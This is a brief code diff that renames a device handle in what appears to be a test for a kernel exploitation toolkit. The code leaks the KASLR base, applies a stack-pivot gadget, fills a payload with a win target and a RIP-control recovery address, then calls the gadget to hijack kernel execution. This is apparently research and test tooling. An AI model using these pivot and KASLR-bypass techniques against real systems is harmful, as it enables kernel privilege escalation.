@@ -112,18 +112,18 @@ public:
         auto pivot = finder.Find(8);
         Log("selected pivot: %s", pivot->GetDescription().c_str());
 
-        auto& kpwn = env->GetXdkDevice();
-        auto kaslr = kpwn.KaslrLeak();
+        auto& xdk = env->GetXdkDevice();
+        auto kaslr = xdk.KaslrLeak();
         pivot->ApplyToPayload(p, kaslr);
 
         auto offs = pivot->GetDestinationOffset();
-        p.Set(offs, kpwn.WinTarget());
-        p.Set(offs + 8, kpwn.GetRipControlRecoveryAddr());
+        p.Set(offs, xdk.WinTarget());
+        p.Set(offs + 8, xdk.GetRipControlRecoveryAddr());
         p.Set(offs + 16, 0xffffffff41414141);
 
-        auto buf_addr = kpwn.AllocBuffer(p.GetData(), true);
-        kpwn.CallAddr(kaslr + pivot->GetGadgetOffset(), { { buf_reg, buf_addr } });
-        kpwn.CheckWin();
-        kpwn.Kfree(buf_addr);
+        auto buf_addr = xdk.AllocBuffer(p.GetData(), true);
+        xdk.CallAddr(kaslr + pivot->GetGadgetOffset(), { { buf_reg, buf_addr } });
+        xdk.CheckWin();
+        xdk.Kfree(buf_addr);
     }
 };
